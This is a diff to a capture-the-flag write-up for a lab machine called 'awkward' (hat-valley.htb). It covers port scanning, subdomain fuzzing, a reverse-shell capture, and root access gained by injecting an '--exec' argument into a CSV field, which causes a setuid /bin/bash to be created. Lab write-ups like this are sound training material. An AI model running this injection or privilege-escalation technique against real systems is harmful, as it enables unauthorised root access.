@@ -1,3 +1,9 @@
+### Tools: 
+
+### Vulnerabilities: 
+
+Nmap shows an ssh port open and of course a webpage.
+
 ```console
 └─$ nmap -A -p- -T4 -Pn 10.129.228.81
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-27 12:49 CDT
@@ -17,6 +23,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds
 ```
+From looking at the webpage we get a hint about a second domain.
+
+
+Fuzzing for it gave us back a webpage but unfortunately we cannot access it without some credentials. We can try it out later if we find anything.
+
 
 ```console
 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -u http://hat-valley.htb -H "HOST: FUZZ.hat-valley.htb" -v -fs 0,132  -c
@@ -701,7 +712,7 @@ bean@awkward:~$
 ```
 ```console
 bean@awkward:~$ cat user.txt
-c14351cd4d8b1f018bed794e94c871bf
+c14*****************************
 ```
 We learn that the username for nginx is admin and since bean.hill is the admin we can use his password to login.
 
@@ -885,4 +896,16 @@ connect to [10.10.16.6] from (UNKNOWN) [10.129.228.81] 58084
 sh: 0: can't access tty; job control turned off
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+```
+www-data@awkward:~/private$ echo '" --exec=!/tmp/suid.sh "' > leave_requests.csv
+```
 
+```console
+bean@awkward:/tmp$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1396520 Jan  7  2022 /bin/bash
+bean@awkward:/tmp$ bash -p
+bash-5.1# id
+uid=1001(bean) gid=1001(bean) euid=0(root) groups=1001(bean)
+bash-5.1# cat /root/root.txt
+795*****************************
+```
